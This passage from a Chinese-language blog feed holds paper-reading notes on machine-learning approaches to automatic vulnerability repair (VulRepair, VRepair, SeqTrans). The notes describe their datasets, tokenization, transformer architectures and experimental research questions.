ID，其在分词时不会被拆分</p><h3 id="3-1-2-词嵌入"><a href="#3-1-2-词嵌入" class="headerlink" title="3.1.2.词嵌入"></a>3.1.2.词嵌入</h3><p>源代码由多个token组成，每个token的语义依赖于上下文和其在函数中的位置，捕获代码上下文及其在函数中的位置很重要。此步骤的目的是捕获token的语义和其在函数中的位置以生成嵌入向量。</p><p>对于每个已经进行subword分词的函数，在 <strong>step 2a</strong> 中，为每个subword token生成一个 [1x768] 的嵌入向量，并将其组合成一个矩阵，以表示给定token与其他token之间的联系；为了捕获token的语义，利用在上面讨论的预训练分词器相同的语料库上预训练的词嵌入向量；为了捕获函数中每个token的位置，利用相对位置进行嵌入，该嵌入将在自注意力计算期间计算并添加到 K矩阵 和 V矩阵中。</p><h2 id="3-2-VulRepair模型结构"><a href="#3-2-VulRepair模型结构" class="headerlink" title="3.2.VulRepair模型结构"></a>3.2.VulRepair模型结构</h2><p>此学习模型使用的CodeT5的默认配置，即12个编码器、12个解码器、hidden size为786、12个注意力头</p><h3 id="3-2-1-Encoder-Stack"><a href="#3-2-1-Encoder-Stack" class="headerlink" title="3.2.1.Encoder Stack"></a>3.2.1.Encoder Stack</h3><p>在 <strong>step 2b</strong> 中，实现了 12 层编码器块的堆栈，以导出解码器使用的编码器隐藏状态。与原始的 Transformer 编码器类似，每个编码器块都从层归一化开始，其中<a href="https://dl.acm.org/doi/abs/10.5555/3455716.3455856">仅重新缩放激活且不应用附加偏差</a>;每个编码器块由两个子组件组成：<a href="https://arxiv.org/abs/1803.02155">一个具有相对位置编码的多头自注意力层 </a> ，后跟一个前馈神经网络;每个编码器中的每个子组件（即自注意力和 FFNN）周围都有一个残差连接。</p><p>自注意力机制使用点积运算(dot product operation)计算每个token的相关分数，其中每个token与自身和其他token交互一次。其依赖于三个主要向量，Query、Key 和 Value。Query 是当前token的表示，用于根据存储在 Key 向量中的key对所有其他token进行评分；每个 token 的注意力得分是通过对所有 Query 向量和 Key 向量进行点积得到的；然后使用 Softmax 函数将注意力分数归一化为概率以获得注意力权重；最后，可以通过Value向量和注意力权重向量之间的点积来更新Value向量。</p><p>与VRepair利用带有词嵌入层的绝对位置编码层来捕获输入序列中的位置信息不同，作者使用相对位置编码来考虑输入序列中相对位置的表示和token之间的距离(the relation-aware self-attention mechanism)。VulRepair中使用的自注意是一个具有相对位置编码的缩放点积自注意力（scaled dot-product self-attention with relative position encoding）。自注意使用𝑄，𝐾，𝑉，𝑃四个矩阵计算。相对位置信息P作为Key矩阵和Value矩阵的附加分量提供给模型：</p><p><img src="image-20240520144756836.png" alt="image-20240520144756836"></p><p>其中P是点积运算中两个输入的边表示，以确定token之间的位置信息.</p><p>与利用每个位置的固定嵌入的绝对位置编码不同，成对位置编码（pairwise positional encoding）根据自注意力操作中 K 和 Q 之间的偏移量产生不同的学习嵌入。因此，它可以有效地捕获token之间的相关信息。</p><p>为了捕获输入序列更丰富的语义，作者使用多头机制来实现自注意力，能够让模型同时关注来自不同位置的不同代码表示的子空间的信息。对于 d 维 Q、K、V 向量，作者将这些向量分成 h 个头，其中每个头有 d&#x2F;h 维。在所有的自注意力计算之后，将每个头再次连接起来，输入一个完全连接的前馈神经网络，包括两个线性变换，中间有一个 ReLU 激活函数。</p><p>多头机制可以总结为以下等式：</p><p>𝑀𝑢𝑙𝑡𝑖𝐻𝑒𝑎𝑑 (𝑄, 𝐾, 𝑉 ) &#x3D; 𝐶𝑜𝑛𝑐𝑎𝑡 ($head_1$, …, $head_ℎ$)$W^𝑂$ </p><p>$head_i$ &#x3D; Attention(${𝑄𝑊_𝑖}^Q$ , ${K𝑊_𝑖}^K$ ,${V𝑊_𝑖}^V$) </p><p>$𝑊^𝑂$ 用于连接后线性投影到预期维度。</p><h3 id="3-2-2-Decoder-Stack"><a href="#3-2-2-Decoder-Stack" class="headerlink" title="3.2.2.Decoder Stack"></a>3.2.2.Decoder Stack</h3><p><strong>step 2c</strong> ，由十二层解码器块组成，根据最后一个编码器块提供的隐藏状态生成漏洞修复。每个解码器块都以编码器块中的层归一化开始；每个解码器块由三个子组件组成：具有相对位置编码的masked多头自注意层、具有相对位置编码的多头编码-解码器自注意力机制、前馈神经网络；与编码器块相同，每个解码器中的每个子组件周围都有一个残差连接，然后是层归一化步骤。生成模型的训练阶段使用的masked多头自注意来限制模型预测下一个标记而不关注后面的上下文，在该阶段模型将只能在生成过程中处理先前的标记。</p><h3 id="3-2-3-Linear-and-Softmax-Layer"><a href="#3-2-3-Linear-and-Softmax-Layer" class="headerlink" title="3.2.3.Linear and Softmax Layer"></a>3.2.3.Linear and Softmax Layer</h3><p>线性层是一个完全连接的神经网络，它将解码器堆栈产生的向量投影到更大的逻辑向量中，其中单元格的数量等于词汇表中唯一token的数量；下面的 Softmax 层将值转换为加起来为 1 的概率分布，用于生成step3 中的最终输出。</p><h2 id="3-3-漏洞补丁生成"><a href="#3-3-漏洞补丁生成" class="headerlink" title="3.3.漏洞补丁生成"></a>3.3.漏洞补丁生成</h2><p>step 3输出后，利用 beam search 根据条件概率在每个时间步为输入序列选择多个漏洞修复选者；候选者的数量取决于 beam宽度 β 的参数设置。换句话说， beam search在每个时间步使用最佳优先搜索策略以最高概率选择最佳 β 位修复候选者。当遇到 EOS token（即“”）时， beam search终止。</p><h1 id="4-实验"><a href="#4-实验" class="headerlink" title="4.实验"></a>4.实验</h1><p>作者使用训练集去微调预训练的 COdeT5 模型获得合适的权重用于漏洞修复，训练的过程中使用交叉熵损失（H(p,q)&#x3D;-${\Sigma}_{x∈X}$p(x)logq(x)）更新模型，并在预测序列中的每个位置和真实序列中的每个位置之间进行优化；其中 X 是BPE分词器生成的token ，𝑝 是真实概率分布, 𝑞 是预测的概率分布。作者使用验证集按时期监控训练过程，并根据针对验证集（而非测试集）的最佳损失值选择最佳微调权重，以获得最佳模型。</p><p>微调过程中，学习速率为2$e^{-5}$且线性衰减，将反向传播与 <a href="https://arxiv.org/abs/1711.05101">AdamW 优化器</a> 结合使用，后者被广泛用于微调基于 Transformer 的模型以更新模型并最小化损失函数。</p><p>(RQ1) What is the accuracy of our VulRepair for generating software vulnerability repairs?</p><p>VulRepair与两种基线方法进行对比，beam 为50</p><p><img src="image-20240520144805361.png" alt="image-20240520144805361"></p><p>(RQ2) What is the benefit of using a pre-training component for vulnerability repairs?</p><p><img src="image-20240520144813339.png" alt="image-20240520144813339"></p><p><img src="image-20240520144822285.png" alt="image-20240520144822285"></p><p>(RQ3) What is the benefit of using BPE tokenization for vulnerability repairs?</p><p><img src="image-20240520144830379.png" alt="image-20240520144830379"></p><p><img src="image-20240520144838196.png" alt="image-20240520144838196"></p><p>(RQ4) What are the contributions of the components of our VulRepair?</p><p><img src="image-20240520144845059.png" alt="image-20240520144845059"></p><p><img src="image-20240520144858166.png" alt="image-20240520144858166"></p><p><img src="image-20240520144906926.png" alt="image-20240520144906926"></p>]]></content>
      
      
      <categories>
          
          <category> 论文阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞修复 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Neural Transfer Learning for Repairing Security Vulnerabilities in C Code</title>
      <link href="/2023/04/24/Vrepair/"/>
      <url>/2023/04/24/Vrepair/</url>
      
        <content type="html"><![CDATA[<p>下面分享一篇我发表在安全学术圈上的论文笔记。<a href="https://mp.weixin.qq.com/s/wLequNUfLN0go-nHFGujpg">原文</a></p><blockquote><p><em>原文标题：Neural Transfer Learning for Repairing Security Vulnerabilities in C Code</em><br><em>原文作者：Zimin Chen , Steve Kommrusch , Martin Monperrus</em><br><em>原文链接：<a href="https://ieeexplore.ieee.org/abstract/document/9699412">https://ieeexplore.ieee.org/abstract/document/9699412</a></em><br><em>发表期刊：IEEE Transactions on Software Engineering</em><br><em>笔记作者：senu11@SecQuan</em><br><em>笔记小编：黄诚@SecQuan</em></p></blockquote><h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h1><p>  这篇文章与SeqTrans的区别是这篇文章使用迁移学习训练修复c语言的安全漏洞，SeqTrans 在 NMT 上预训练再微调修复Java的安全漏洞</p><p>  在收集的bug修复语料上训练的模型在 Big-Vul 漏洞修复数据集上达到 21.86 % 的准确率，在 CVEfixes 漏洞修复数据集上达到 22.73% 的准确率</p><h1 id="2-数据集"><a href="#2-数据集" class="headerlink" title="2.数据集"></a>2.数据集</h1><p>  项目：<a href="https://github.com/SteveKommrusch/VRepair%EF%BC%8C%E5%85%B6%E4%B8%AD%E4%BB%8B%E7%BB%8D%E4%BA%86%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%95%B0%E6%8D%AE%E9%9B%86%E7%9A%84%E8%A7%84%E6%A8%A1">https://github.com/SteveKommrusch/VRepair，其中介绍了漏洞修复数据集的规模</a></p><p>  详细介绍如下：</p><p>  bug修复数据集：作者收集了GitHub上2017-01-01至2018-12-31关于C语言的bug修复commit,从<a href="https://www.gharchive.org/">GH Archive</a>下载。</p><p>  使用关键字 fix 、 solve 、 repair 、 bug 、 issue 、 problem 、 error 、 fault 、 vulnerability作为bug修复判断依据进行提取，总共分析了 7.29 亿 (728916054) 个commit，并选择了 2100 万 (20568128) 个确定为bug修复commit，超过了Tufano 数据集的大小（10056052）；据文件扩展名进一步过滤bug修复commit，并删除未修复任何以“.c”结尾的文件的提交，最终 910000 个bug修复的 C commit。</p><p>  为了识别修改前后的文件，使用 GNU 编译预处理删除所有注释，并提取具有相同函数签名的函数以便进行比较；然后使用 Clang 来解析并tokenize函数的源代码；在“.c”文件中，只考虑完整函数（而非prototypes）；最终获得了 1838740 个函数级的更改，删除重复函数后减少到 655741；使用下文的 content size &#x3D;3 ，最终得到650499 个。</p><p>  将此数据集划分为 Btrain（用于模型训练，534858 个样本）和 Bval（用于模型验证，10000 个样本）</p><p>  漏洞修复数据集：<a href="https://dl.acm.org/doi/abs/10.1145/3379597.3387501">Big-Vul</a>、<a href="https://dl.acm.org/doi/abs/10.1145/3475960.3475985">CVEfixes</a></p><p> Big-Vul 数据集是通过爬取 CVE 数据库并提取漏洞相关信息（例如 CWE ID 和 CVE ID）创建的。然后，根据项目的不同，作者为每个项目的页面开发了不同的爬虫，以获取修复漏洞的 git 提交链接。 Big-Vul 总共包含 348 个项目的 3754 个不同漏洞，这些漏洞被归类为 91 个不同的 CWE ，时间范围从 2002 年到 2019 年。CVEfixes 数据集的收集方式类似于 Big-Vul 数据集。该数据集包含 1754 个项目的 5365 个漏洞，分为 180 个不同的 CWE ，时间范围从 1999 年到 2021 年。</p><h1 id="3-框架"><a href="#3-框架" class="headerlink" title="3.框架"></a>3.框架</h1><p>  该框架由三个部分组成，分别对应bug修复数据集训练阶段、漏洞修复数据集训练阶段、补丁生成阶段</p><p><img src="image-20240520150854907.png" alt="image-20240520150854907"></p><h2 id="3-1-前期准备"><a href="#3-1-前期准备" class="headerlink" title="3.1.前期准备"></a>3.1.前期准备</h2><h3 id="3-1-1-文本表示"><a href="#3-1-1-文本表示" class="headerlink" title="3.1.1.文本表示"></a>3.1.1.文本表示</h3><p>  在了解Vrepair之前，需要先看看其将代码怎样表示以输入到网络中，又是以怎样的方式输出的。输入输出网络的格式如下所示。</p><p><img src="image-20240520150901310.png" alt="image-20240520150901310"></p><p>  box(a)中的红色代码是含有漏洞的，box(b)对应位置的绿色代码是修复后的；</p><p>  box(c)，这是网络的输入格式，在输入网络之前会删除函数的换行符，在有漏洞的语句前后添加 <StartLoc> 和 <EndLoc> 两个特殊token标识；在整个函数之前添加了CWE标识该函数可能所属的漏洞类型，但是作者在框架介绍部分只讲了CWE可以由静态分析工具分析产生。为了满足模型内存需求，将函数的输入长度限制为 1000 个token，并将异输出限制为 100 个token</EndLoc></StartLoc></p><p>  box(d)和box(e)，这是网络的输出格式，使用两个特殊token &lt;ModStart&gt; 和 &lt;ModEnd&gt;，它们后面跟着一串token序列，记为 $n_{token}$，后面的$n_{token}$是用来标识更改代码的开始和结束代码，应当具有唯一性。</p><p>  box(d)和box(e)均有一个特殊标记 content size 3、ontent size 2，这是token &lt;ModStart&gt; 和 &lt;ModEnd&gt;后$n_{token}$的数量；当为3时，box(d)中有17个token序列，为2时，box(e)有14个token序列。但是当content size &#x3D; 2 时，会发现 &lt;ModEnd&gt;后面的$n_{token}$ 也即“;}”在原函数中不是唯一的，分别在第4、6行出现了共两次，不具备唯一性，这也是导致box(g)中为什么会出现3种补丁的原因，故作者将content size 设置为3，并将其应用于数据集上的所有函数。</p><h3 id="3-1-2-分词-Tokenization"><a href="#3-1-2-分词-Tokenization" class="headerlink" title="3.1.2.分词(Tokenization)"></a>3.1.2.分词(Tokenization)</h3><p>  作者使用 Clang 作为分词器处理c源代码，处理后的token没有subtoken(作者通过实验确定subtoken会增加输入和输出长度)；<a href="https://ieeexplore.ieee.org/abstract/document/8827954/">根据</a>，作者使用复制机制（直接将稀有token从输入序列复制&#x2F;重用到输出序列）来处理 OOV (Out-Of-Vocabulary,训练时未出现，测试时出现了的单词)；另外不将变量重命名，因为它隐藏了有关可以通过词嵌入学习的变量的有价值信息，如GetResult 应该是一个返回结果的函数。</p><h2 id="3-2-bug修复数据集训练阶段"><a href="#3-2-bug修复数据集训练阶段" class="headerlink" title="3.2.bug修复数据集训练阶段"></a>3.2.bug修复数据集训练阶段</h2><p>  按照第 3.1 和 3.2 节中描述的过程来处理 buggy 和 fixed 函数，并提取要提供给网络的 VRepair 表示。所有token序列前面都有一个特殊token “CWE-xxx”，指示此漏洞属于哪种类型的 CWE 类别。添加这个特殊标记是因为作者认为具有相同 CWE 类别的漏洞以类似的方式修复。对于没有此信息的bug修复语料库，使用“CWE-000”标记表示“通用修复”。这个特殊标记对于漏洞修复训练和补丁生成阶段也是强制性的。</p><p>  为了解决过拟合，在bug修复数据集训练期间使用<a href="https://link.springer.com/chapter/10.1007/978-3-642-35289-8_5">early stopping</a> 。为了提前停止，bug修复数据集的一个子集被保留用于训练期间的模型验证。如果两次评估后验证精度没有提高，就停止训练阶段，并使用验证精度最高的模型进行漏洞修复数据集训练。</p><h2 id="3-3-漏洞修复数据集训练阶段"><a href="#3-3-漏洞修复数据集训练阶段" class="headerlink" title="3.3.漏洞修复数据集训练阶段"></a>3.3.漏洞修复数据集训练阶段</h2><p>  接下来，使用bug修复验证数据集来选择bug修复数据集训练产生的最佳模型，并在漏洞修复数据集上对其进行调整。所有的处理和bug修复数据集训练阶段处理一致。为了确保每个 “CWE-xxx “ 特殊token有足够的训练数据，统计出最常见的CWE ID，并且只保留词汇表中具有足够例子的CWE ID。作者保留的CWE ID涵盖了所有漏洞的80%，而没有保留在词汇表中的CWE ID则被替换为’CWE-000’。这里还使用了早期停止，具有最高验证精度的模型被用于补丁生成。</p><h2 id="3-4-补丁生成阶段"><a href="#3-4-补丁生成阶段" class="headerlink" title="3.4.补丁生成阶段"></a>3.4.补丁生成阶段</h2><p>  经过bug修复数据集和漏洞修复数据集训练阶段后，就可以用于生成补丁了。将可疑函数经过3.1.节处理后输入给VRepair，VRepair 使用 Transformer 模型为给定输入创建多个token context diff提议，对于神经网络的每个预测，VRepair 找到应用补丁的上下文，并应用预测的补丁来创建补丁函数（这句话意思就是VRepair只输出更改后的token，并不是将整个函数的token序列输出，所以需要重新找到上下文填充进去才能形成整个函数，并且VRepair可以修改多行代码）。 Beam search对模型的输出进行排序，并且系统可以考虑 n 个最可能的输出。</p><p>  VRepair 生成补丁后，由人类、测试组或静态分析器进行验证。例如，如果漏洞是由静态分析器发现的，则可以通过同一个静态分析器再次验证已打补丁的程序，以确认该漏洞已被 VRepair 修复。由于此评估可能会消耗时间和资源，因此提出了一种新的 Beam 称为 VRepair beam 改进 Beam Search，通过限制 VRepair beam 来评估 VRepair 系统的输出，该限制代表 VRepair 提出的用于再次验证的程序数量。</p><p>  VRepair beam &#x3D; combination(Neural beam，Interpretation beam)</p><p>Neural beam 是由神经网络创建的一组预测，从最有可能的开始，一直持续到输出了配置的最大数量；Interpretation beam 就是在给定content size值下，可能产生的预测数，如图2，当 content size &#x3D; 3 时，Interpretation beam &#x3D; 1，当 content size &#x3D;2 ，Interpretation beam &#x3D;3 ；VRepair beam 是从 Neural beam 和 Interpretation beam 创建的所有程序的笛卡尔积。</p><h2 id="3-5-VRepair基于Transformer的神经网络结构"><a href="#3-5-VRepair基于Transformer的神经网络结构" class="headerlink" title="3.5.VRepair基于Transformer的神经网络结构"></a>3.5.VRepair基于Transformer的神经网络结构</h2><p>  VRepair 使用如图 3 所示的 Transformer 架构。</p><p><img src="image-20240520150909044.png" alt="image-20240520150909044"></p><p>  首先，模型接收经3.1.1.节处理过的漏洞代码；多头注意力层的多个副本学习输入数据的隐藏表示；然后第二组多头注意力层使用这些表示来生成最有可能输出的标记的概率表；此外，作者使用了一种复制机制<a href="https://arxiv.org/abs/1603.06393">Incorporating copying mechanism in sequence-to-sequence learning</a>、<a href="https://ieeexplore.ieee.org/abstract/document/8827954/">SequenceR: Sequence-to-Sequence Learning for End-to-End Program Repair</a>，训练一个替代神经网络学习将输入token复制到输出，以减少所需的词汇量。<br>  输出的第一个token完全基于模型已经从输入代码学习的隐藏表示所产生的。当token输出时，它们可以作为模型的输入，因此它可以正确地调整下一个令牌的概率。例如，在图3中，令牌’ &amp;&amp; (d &gt; a* ‘序列输出后，模型预测下一个令牌应该是’ b ‘，概率为0.8</p><p>  VRepair 的 Hyperparameters 如表1所示，</p><p><img src="image-20240520150916941.png" alt="image-20240520150916941"></p><h1 id="4-实验"><a href="#4-实验" class="headerlink" title="4.实验"></a>4.实验</h1><p><img src="image-20240520150926953.png" alt="image-20240520150926953"></p><p>  RQ1:仅使用bug修复数据集或者漏洞修复数据集训练的准确性是多少？</p><p><img src="image-20240520150940576.png" alt="image-20240520150940576"></p><p><img src="image-20240520150949059.png" alt="image-20240520150949059"></p><p>  RQ2:在bug修复数据集上训练然后使用漏洞修复数据集训练（调整）的模型是否比R1更好？</p><p><img src="image-20240520150956881.png" alt="image-20240520150956881"></p><p>  RQ3:与去噪预训练相比，迁移学习的准确性如何？</p><p><img src="image-20240520151005278.png"></p><p>  RQ4:不同的数据拆分策略如何影响本文所提模型的准确性？</p><p><img src="image-20240520151012166.png" alt="image-20240520151012166"></p><p><img src="image-20240520151019827.png"></p>]]></content>
      
      
      <categories>
          
          <category> 论文阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞修复 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SeqTrans: Automatic Vulnerability Fix via Sequence to Sequence Learning</title>
      <link href="/2023/04/18/SeqTrans/"/>
      <url>/2023/04/18/SeqTrans/</url>
      
        <content type="html"><![CDATA[<p>下面分享一篇我发表在安全学术圈上的论文笔记。<a href="https://mp.weixin.qq.com/s/EiyWtQNjjC0IZISPzqhgSg">原文</a></p><blockquote><p><em>原文标题：SeqTrans: Automatic Vulnerability Fix via Sequence to Sequence Learning</em><br><em>原文作者：Jianlei Chi, Yu Qu, Ting Liu, Member, IEEE, Qinghua Zheng, Member, IEEE, Heng Yin, Member, IEEE</em><br><em>原文链接：<a href="https://ieeexplore.ieee.org/abstract/document/9729554">https://ieeexplore.ieee.org/abstract/document/9729554</a></em><br><em>发表期刊：IEEE Transactions on Software Engineering</em><br><em>笔记作者：senu11@SecQuan</em><br><em>笔记小编：ourren@SecQuan</em></p></blockquote><p>一句话概括就是作者认为漏洞修复数据集是bug修复数据集的子集，可以利用bug修复数据集在 NMT 预训练一个模型，然后再用漏洞修复数据集训练进行微调就可以生成补丁修复漏洞。</p><h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h1><p>在工业界和学术界都有许多自动程序修复（APR）或称为代码迁移的工作。一些 APR 研究侧重于自动生成修复模板或称为修复模式,如<a href="https://ieeexplore.ieee.org/abstract/document/8813263">Meditor</a>、<a href="https://dl.acm.org/doi/abs/10.1145/1932682.1869486">api usage adaptation</a>;一些 APR 研究侧重于从历史修复记录中挖掘相似的代码更改，例如  <a href="https://dl.acm.org/doi/abs/10.1145/3180155.3180233">CapGen</a> 和 <a href="https://link.springer.com/article/10.1007/s10664-019-09780-z">FixMiner</a>;其他方法利用带有约束求解的<a href="https://ieeexplore.ieee.org/abstract/document/8667970/">静态</a>和<a href="https://ieeexplore.ieee.org/abstract/document/6606623/">动态</a>分析来完成补丁生成; IDE 还提供特定类型的自动更改,例如，重构、生成 getter 和 setter、添加覆盖&#x2F;实现方法或其他模板代码等。最近，将机器学习 (ML) 技术引入程序修复也引起了很多兴趣并成为一种趋势，它们构建通用模型以使用以前的代码更改捕获统计特征并自动修复正在插入的代码。大多数 APR 方法严重依赖特定领域的知识或预定义的更改模板，这导致 <a href="https://dl.acm.org/doi/abs/10.1145/3105906">可扩展性有限</a>。 </p><p><strong>motivation</strong></p><p><img src="image-20240520150036038.png" alt="image-20240520150036038"></p><p>如上图两个CVE的修复所示，CVE-20171000390 和 CVE-2017-1000388属于同一CWE: CWE-732。这启发作者，有可能从对应于相同或相似 CWE 的历史漏洞修复中学习常见模式去修复漏洞。</p><p><strong>文章提出了一种称为 SeqTrans 的新方法来利用历史漏洞修复提供建议并自动修复源代码。为了捕获易受攻击代码周围的上下文信息，利用数据流依赖关系来构建代码序列并将它们提供给转换器模型；引入了微调策略来克服小样本问题。SeqTrans 可以与其他漏洞检测工具一起工作，例如 Eclipse Steady，可以在函数级别定位漏洞</strong>。</p><p><strong>Fine-tuning</strong><br>微调，获取经过训练的神经网络的权重，并将其用作目标任务的初始化或固定特征提取器。作者在原文中解释使用微调有以下好处：1）克服样本量小：训练大型神经网络不切实际，无法避免过度拟合。若想利用大型神经网络超强的特征提取能力，只能靠微调已经训练好的模型； 2）后期训练成本低，速度快； 3）无需一遍又一遍地造轮子：前人花大力气训练出来的模型，大概率会比从头造出的模型更强。</p><p>文章在包含 1,282 次commit的数据集上评估 SeqTrans，这些提交含有624个漏洞，涉及 205 个 Java 项目。模型结果因不同类型的 CWE 而异，在 CWE-287（不正确的身份验证）和 CWE-863（不正确的授权）等特定类型的 CWE 中表现良好，但无法对某些 CWE（如 CWE-918（服务器端请求伪造））做出任何预测，SeqTrans 可以覆盖数据集中大约 25% 的 CWE 类型。</p><h1 id="2-数据集"><a href="#2-数据集" class="headerlink" title="2.数据集"></a>2.数据集</h1><p>文章使用了两个数据集：<a href="https://sites.google.com/view/learning-fixes/data">Tufano</a>和<a href="https://github.com/SAP/vulnerability-assessment-kb">Ponta</a>，Tufano数据集是bug修复(bug repair)数据集，Ponta是漏洞修复数据集。文章是在Java语言上进行实验。</p><p>Tufano数据集包含 780000 个bug修复提交和近 200 万句对的历史bug修复记录。对于每个bug修复提交，使用 GitHub Compare API 提取bug修复前后的源代码。每个bug修复记录都包含错误（提交前）和修复（提交后）代码。该数据集丢弃了与非 Java 文件相关的提交和在bug修复提交中创建的新文件，并且还丢弃了影响超过五个 Java 文件的提交。</p><p>Ponta数据集含有624个漏洞，自 2008 年到 2019 年，涉及 205 个不同开源 Java 项目，共1282个修复这些漏洞的提交。数据集中 29 个没有 CVE 标识符，46 个有编号机构分配的 CVE 标识符，但在 NVD 中不可用，这些漏洞已从数据集中删除，非重复 CVE 的最终数量为 549 个，相关提交为 1068 个，归类为 77 个 CWE。</p><p>下面是两个数据集的token分布：</p><p><img src="image-20240520150043172.png" alt="image-20240520150043172"></p><p>已经确认的CVE数量接近150K，而Ponta 数据集和<a href="https://source.android.com/security/bulletin">AOSP数据集</a> 等漏洞修复数据集仅包含 624 和 1380 个公开披露的漏洞，这也就是上文说到小样本问题的来由。</p><h1 id="3-框架"><a href="#3-框架" class="headerlink" title="3.框架"></a>3.框架</h1><p>整个SeqTrans框架如下图所示，由三个阶段组成：预处理、预训练和微调、预测和补丁生成。<br><img src="image-20240520150052396.png" alt="image-20240520150052396"></p><h2 id="3-1-预处理"><a href="#3-1-预处理" class="headerlink" title="3.1.预处理"></a>3.1.预处理</h2><p>此步骤将从两个数据集中提取差异上下文：bug repair(下文称为bug修复)和vulnerability fixing(下文称为漏洞修复)数据集。然后，基于数据流依赖性执行规范化和抽象以提取 def-use 链。def-use 链输入到 transformer 模型中，以更少的噪声捕获围绕漏洞的语法和结构信息。</p><h3 id="3-1-1-差异代码提取"><a href="#3-1-1-差异代码提取" class="headerlink" title="3.1.1.差异代码提取"></a>3.1.1.差异代码提取</h3><p>Tufano数据集提供了从bug修复提交(bug-fixing commits)中提取的原始源代码对，易于使用。Ponta 的数据集仅提供包含漏洞修复记录的 CSV 表，该表包含漏洞修复记录如下：</p><p>(vulnerability id; repository url; commit id)</p><p>vulnerability id是在repository url的开源代码存储库中的commit id中修复的漏洞的标识符。数据集中的每一行代表一个修复漏洞的提交，作者利用爬虫爬取。拉取请求 (PR) 数据将根据commit id提取，然后利用 JGit 检索 PR 代码更改前后的 Java 文件版本，称为 ChangePair(CP)，每个 CP 包含一个代码差异列表。作者从 Ponta 和 Tufano 的数据集中分别提取了 5K 、650K CP。</p><p>从 PR 中获取到 CP 后，需要定位差异上下文。对于轻微的代码结构更改(如换行和添加空格)，并不需要，故作者使用抽象语法树 (AST) 来搜索代码差异，利用差异搜索工具GumTree搜索细粒度的 AST 节点映射。</p><p>之后，每个 CP 都表示为代码差异列表：<br>CP &#x3D; ${(st_{src}, st_{dst})}<em>1$, …, ${(st</em>{src}, st_{dst})}_n$</p><p>其中$(st_{src}, st_{dst})$ 表示来自源文件和目标文件的语句。</p><p>然后，围绕代码差异提取数据流依赖关系，来构建 def-use 链。 def-use 链包含来自易受攻击语句的所有变量定义。使用数据流依赖关系的原因如下所示：</p><p>1）易受攻击语句周围的上下文对于理解风险行为和捕获结构关系很有价值。但是，在class级别使用大量不相关的代码来维护完整的上下文过于繁重。</p><p>2）数据流依赖为transformation提供了足够的上下文。如果需要修改一个语句，则很有可能同时共同更改其定义。</p><p>3）控制流依赖项通常包含分支，其太长而无法tokenization(下文称为标记化)。</p><p><img src="image-20240520150059609.png" alt="image-20240520150059609"></p><p>如上图所示，假设函数“foo”含有漏洞，算法将保留该函数和漏洞声明、所有全局变量、所有对易受攻击语句具有数据依赖性的语句，位于同一函数中易受攻击语句之后的语句被删除。</p><p>可以从 AST 中提取 def-use 依赖项。该过程可以分为三个部分：</p><p>1）遍历整个AST，分别标注变量名、常量名、字符串名。这些名称分布在 AST 的叶节点上。这一步将在修改后的 Gumtree 算法的第一阶段完成。</p><p>2）从叶子节点向上遍历，查找定义好的父节点，记录位置。</p><p>3）通过定第二步的定位记录定位易错语句的相关定义语句。</p><p>另一个名为Understand的静态分析工具用于将位置记录转换为代码。 SeqTrans 将改变每个 CP，如下所示：</p><p>CP &#x3D; ${((def_1, …, def_n, st_{src}), (def_2, …, def_m, st_{dst}))}<em>1$, …, ${((def_1, …, def_n, st</em>{src}), (def_2, …, def_m, st_{dst}))}_n$</p><p>文章忽略涉及添加或删除整个函数&#x2F;文件的代码更改。</p><h3 id="3-1-2-规范化与分词"><a href="#3-1-2-规范化与分词" class="headerlink" title="3.1.2.规范化与分词"></a>3.1.2.规范化与分词</h3><p>在 NMT 模型的训练过程中，存在一些缺点。因为 NMT 模型输出单词的概率分布，所以它们在处理许多可能的单词时会变得非常慢，故需要人为地限制模型处理的最常见单词的数量，也称为词汇量。为了减少词汇量，需要在抽象上下文的同时保留源代码的语义信息。</p><p><img src="image-20240520150107420.png" alt="image-20240520150107420"></p><p>规范化过程如上图所示，将变量名称替换为“var1”，，，“varn”, 每个文字和字符串也被替换为 “num1”, . . . ，“numn”和“liter”。这样做的原因如下：</p><p>1）减少词汇量和特定token的频率； </p><p>2）减少数据的冗余，提高数据的一致性。</p><p>并且维护一个字典来存储原始token和预测后要重新填充的替代token之间的映射，<strong>用来恢复预测之后的代码。通过上述优化，就可以控制词汇表的大小，使 NMT 模型专注于从不同的代码更改中学习通用模式</strong>。</p><p>然后将每个抽象 CP 拆分为一系列token，每个 CP 限制为 1500 个token。 <a href="https://arxiv.org/abs/2004.02334">根据 Gowda 的工作</a>，词汇表大小设置为 8k。</p><h2 id="3-2-预训练和微调"><a href="#3-2-预训练和微调" class="headerlink" title="3.2.预训练和微调"></a>3.2.预训练和微调</h2><p><strong>由于bug修复数据集大，且漏洞修复和bug修复的任务有一些共同点，即漏洞修复可以被认为是bug修复的一个子集，训练过程从bug修复数据集开始</strong>。可以从通用任务域数据集和bug修复数据集中学习和捕获部分通用特征和超参数。预训练后，将在漏洞修复数据集上微调 transformer 模型。这个数据集比第一个数据集小得多，因为很难确认和收集足够大的数据集来进行训练。在第一个模型的基础上，会细化一些权重，使模型更适合漏洞修复的任务。这个阶段也成为训练阶段，在此阶段训练 SeqTrans 来转换易受攻击的代码并生成多个预测候选。</p><h3 id="3-2-1-预训练"><a href="#3-2-1-预训练" class="headerlink" title="3.2.1.预训练"></a>3.2.1.预训练</h3><p>在预训练过程中，利用来自 Tufano bug修复数据集的广义领域语料库来进行第一次训练。通过对bug修复数据集的预训练，可以学习到许多修复经验和特征，这些经验和特征可以应用于漏洞修复。使用第 3.1.1. 节中讨论的方法提取 $CPs_{general}$ 列表,这些包含易受攻击版本和修复版本差异上下文的$CPs_{general}$ 将提供给NMT。预训练模型将训练 300K 步直到收敛，因为通过实验发现validation accuracy在这一步训练时变得平滑并且不再波动。在接下来的微调过程中，每个模型每 5K 步会断点备份，会选择在validation数据集上准确率最高的模型作为最终模型。</p><h3 id="3-2-2-微调"><a href="#3-2-2-微调" class="headerlink" title="3.2.2.微调"></a>3.2.2.微调</h3><p>微调的目的是在目标数据集远小于源数据集时提高模型的泛化能力。虽然fine-tuning在神经语言（NL）领域被广泛使用，并且提供了很多预训练模型，但在编程语言（Programming 